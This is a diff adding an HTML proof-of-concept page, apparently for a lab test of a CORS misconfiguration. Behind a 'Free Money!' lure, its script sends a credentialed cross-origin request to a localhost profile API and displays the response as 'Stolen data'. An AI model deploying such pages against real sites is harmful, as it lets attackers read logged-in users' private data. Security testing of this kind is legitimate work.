@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Totally Not Malicious</title>
+</head>
+<body>
+  <h1>Free Money!</h1>
+  <p>Nothing to see here... </p>
+  <pre id="output"></pre>
+
+  <script>
+    const output = document.getElementById('output');
+
+    fetch('http://localhost:7999/api/profile/', {
+      method: 'GET',
+      credentials: 'include'  // forces the browser to attach the victim's session cookie
+    })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Stolen data:', data);
+        output.textContent = 'Stolen data:\n' + JSON.stringify(data, null, 2);
+      })
+      .catch(error => {
+        console.error('Blocked:', error);
+        output.textContent = 'Request blocked: ' + error;
+      });
+  </script>
+</body>
+</html>
